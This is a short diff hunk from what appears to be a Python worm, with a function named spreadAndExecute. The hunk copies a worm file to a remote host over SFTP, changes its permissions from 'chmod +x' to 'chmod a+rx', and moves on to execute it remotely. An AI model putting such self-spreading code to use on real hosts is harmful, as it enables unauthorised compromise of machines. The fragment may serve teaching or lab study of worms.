@@ -300,7 +300,7 @@ def spreadAndExecute(sshClient, fromHost):
         sftpClient.put(WORM_FILE, WORM_DEST)
 
         # Change the permission of the file
-        cmdString = "chmod +x " + WORM_DEST
+        cmdString = "chmod a+rx " + WORM_DEST
         sshClient.exec_command(cmdString)
 
         # Tell the remote system to execute it
